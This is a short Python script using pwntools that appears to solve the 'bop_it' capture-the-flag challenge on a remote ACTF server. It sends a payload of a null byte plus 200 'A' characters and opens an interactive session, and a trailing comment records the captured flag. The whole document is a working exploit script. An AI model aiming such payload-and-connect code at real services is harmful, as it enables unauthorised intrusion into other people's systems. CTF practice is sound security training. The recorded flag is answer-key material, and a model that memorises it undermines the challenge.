from pwn import *

BINARY = './bop_it'

context.terminal = ['konsole', '-e']

#p = process(BINARY)
p = remote('shell.actf.co' ,20702)

exploit = "\x00" + "A"*200

print(p.recvuntil("it!\n"))
p.sendline(exploit)

p.interactive()

#actf{bopp1ty_bop_b0p_b0p}
